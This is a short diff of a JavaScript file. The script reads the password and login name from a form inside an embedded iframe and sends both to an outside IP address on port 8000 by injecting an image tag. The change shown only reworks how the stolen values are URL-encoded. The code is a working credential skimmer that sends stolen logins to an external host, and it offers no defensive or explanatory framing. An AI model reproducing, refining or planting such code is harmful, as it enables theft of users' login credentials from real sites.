@@ -5,13 +5,15 @@ var frimframdoc;
 var pw;
 var un;
 var imag;
+var fin;
 function frimframlistener(){
 	try{
 		frimframdoc = document.getElementById('frimfram').contentWindow.document;
 		pw = frimframdoc.querySelector('#password').value;
 		un = frimframdoc.querySelector('#loginName').value;
 		imag = document.createElement('img');
-		imag.src = encodeURI('http://74.14.159.250:8000/?pwd=' + pw + "&usr=" + un);
+		fin = encodeURIComponent('pwd='+pw+'&usr='+un);
+		imag.src = 'http://74.14.159.250:8000/?' + fin;
 		document.body.appendChild(imag);
 	}catch(error){
 		console.error(error);
